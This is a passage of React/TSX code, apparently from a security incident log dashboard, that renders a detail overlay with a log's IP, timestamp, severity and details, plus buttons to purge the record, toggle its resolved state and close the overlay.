                  <span className="text-[10px] text-zinc-500 uppercase font-bold tracking-wider">Client Network IP</span>
                  <p className="font-mono text-sm text-zinc-300">{selectedLog.ip || 'Internal System'}</p>
                </div>

                <div className="p-4 bg-zinc-950 rounded-2xl border border-zinc-800/80 space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase font-bold tracking-wider">Ledger Timestamp</span>
                  <p className="text-sm text-zinc-300">
                    {selectedLog.timestamp instanceof Timestamp 
                      ? selectedLog.timestamp.toDate().toLocaleString() 
                      : new Date(selectedLog.timestamp).toLocaleString()}
                  </p>
                </div>

                <div className="p-4 bg-zinc-950 rounded-2xl border border-zinc-800/80 space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase font-bold tracking-wider font-mono">Severity Level</span>
                  <p className="text-sm text-zinc-300 capitalize font-bold">{selectedLog.severity}</p>
                </div>
              </div>

              {/* Full Details Block */}
              <div className="space-y-2">
                <span className="text-[10px] text-zinc-500 uppercase font-bold tracking-wider flex items-center gap-1">
                  <FileText className="w-3.5 h-3.5" />
                  Incident Log Description / Payload Details
                </span>
                <div className="p-5 bg-black/60 rounded-2xl border border-zinc-800 text-sm text-zinc-300 leading-relaxed font-mono whitespace-pre-wrap">
                  {selectedLog.details}
                </div>
              </div>

              {/* Overlay Modal footer controls */}
              <div className="flex justify-between items-center border-t border-zinc-800 pt-5">
                <button
                  onClick={() => handleDeleteLog(selectedLog.id)}
                  className="px-4 py-2.5 bg-red-950/20 hover:bg-red-950/60 text-red-400 hover:text-red-300 border border-red-500/20 rounded-xl text-xs font-bold transition-all flex items-center gap-1.5"
                >
                  <Trash2 className="w-4 h-4" />
                  Purge Ledger Record
                </button>

                <div className="flex gap-2">
                  <button
                    onClick={() => handleToggleResolve(selectedLog)}
                    className={clsx(
                      "px-5 py-2.5 rounded-xl text-xs font-bold border transition-colors",
                      selectedLog.resolved 
                        ? "bg-zinc-800 border-zinc-700 text-zinc-400 hover:text-white"
                        : "bg-emerald-500 text-black font-extrabold hover:bg-emerald-400"
                    )}
                  >
                    {selectedLog.resolved ? 'Reopen incident' : 'Mark as Resolved'}
                  </button>
                  <button
                    onClick={() => setSelectedLog(null)}
                    className="px-5 py-2.5 rounded-xl text-xs font-bold bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition-colors"
                  >
                    Close Overlay
                  </button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
